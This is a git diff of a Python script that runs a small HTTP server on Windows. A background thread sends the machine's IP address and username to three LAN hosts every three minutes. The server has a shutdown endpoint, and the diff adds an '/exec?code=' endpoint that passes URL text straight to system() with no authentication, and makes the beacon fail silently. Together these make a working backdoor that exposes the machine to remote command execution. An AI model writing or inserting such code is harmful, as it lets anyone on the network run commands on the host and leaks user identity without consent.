@@ -6,6 +6,8 @@ from re import search, compile
 import time
 from threading import Thread
 from urllib.request import urlopen
+from urllib.error import URLError
+from urllib.parse import unquote
 from jinja2 import Template
 
 home = ["C:\\Users", "\\"]
@@ -60,7 +62,6 @@ class Worker(Thread):
     Send My IP to these three Machines in the background.
     After every three minutes
     """
-
     def run(self):
         ipconfig = popen("ipconfig").read().replace("\n", "")
         net_ip = search(pat, ipconfig).group()
@@ -68,10 +69,10 @@ class Worker(Thread):
             for i in mains:
                 link = "http://192.168.100.{}:{}/ip/{}/{}" \
                     .format(i, serverPort, net_ip, get_username())
-                print(link)
-                import requests
-                requests.get(link)
-                # urlopen(link).read()
+                try:
+                    urlopen(link).read()
+                except URLError:
+                    pass
             time.sleep(180)
             Worker().start()
 
@@ -88,12 +89,12 @@ class MyServer(BaseHTTPRequestHandler):
         self.send_header("Content-type", "text/html")
         self.end_headers()
         self.path = self.path.lower()
+        code = "/exec?code="
         if self.path == "/":
-            with open("index.html") as m:
-                temp = Template(m.read())
-                self.wfile.write(
-                    bytes(temp.render(machines=ips), "utf-8")
-                )
+            temp = Template(self.open_file("index.html"))
+            self.wfile.write(
+                bytes(temp.render(machines=ips), "utf-8")
+            )
 
         elif self.path.startswith("/ip/"):
             try:
@@ -108,6 +109,10 @@ class MyServer(BaseHTTPRequestHandler):
             main_func()
         elif self.path == "/shutdown":
             system("shutdown /s /t 1")
+        elif self.path.startswith(code):
+            code = unquote(self.path.split(code)[1])
+            system(code)
+            self.wfile.write(bytes("Executed", "utf-8"))
         else:
             self.wfile.write(bytes(self.path, "utf-8"))
 
@@ -118,12 +123,11 @@ class MyServer(BaseHTTPRequestHandler):
 
 if __name__ == "__main__":
     webServer = HTTPServer((hostName, serverPort), MyServer)
-    print("Server started http://%s:%s" % (hostName, serverPort))
-
+    print("Server started http://localhost:%s" % serverPort)
     try:
         webServer.serve_forever()
-    except KeyboardInterrupt:
-        pass
+    except KeyboardInterrupt as err:
+        print(err)
 
     webServer.server_close()
     print("Server stopped.")
